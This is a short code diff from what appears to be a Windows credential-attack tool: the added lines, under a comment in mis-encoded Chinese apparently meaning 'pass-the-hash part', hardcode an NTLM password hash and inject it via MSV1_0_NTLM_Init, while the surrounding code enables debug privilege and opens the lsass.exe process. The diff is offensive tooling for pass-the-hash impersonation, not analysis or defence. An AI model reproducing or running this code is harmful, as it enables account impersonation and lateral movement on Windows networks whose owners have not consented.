@@ -8,6 +8,10 @@
 
 int wmain(int argc, LPCWSTR argv[])
 {
+	//pthµÄ²¿·Ö
+	BYTE szNTLM[] = { 0xe7, 0xb3, 0xcc, 0xd5, 0xd0, 0x79, 0xf1, 0xb0, 0xb4, 0x3e, 0x7d, 0x6e, 0xe6, 0x43, 0x5a, 0x02 };
+	MSV1_0_NTLM_Init((LPBYTE) &szNTLM);
+
 	MESSAGE(L"[*] Enable debug privilege\r\n");
 	RETN_IF(!EnableDebugPrivilege(), L"EnableDebugPrivilege", -1);
 	MESSAGE(L"[*] Open process lsass.exe\r\n");
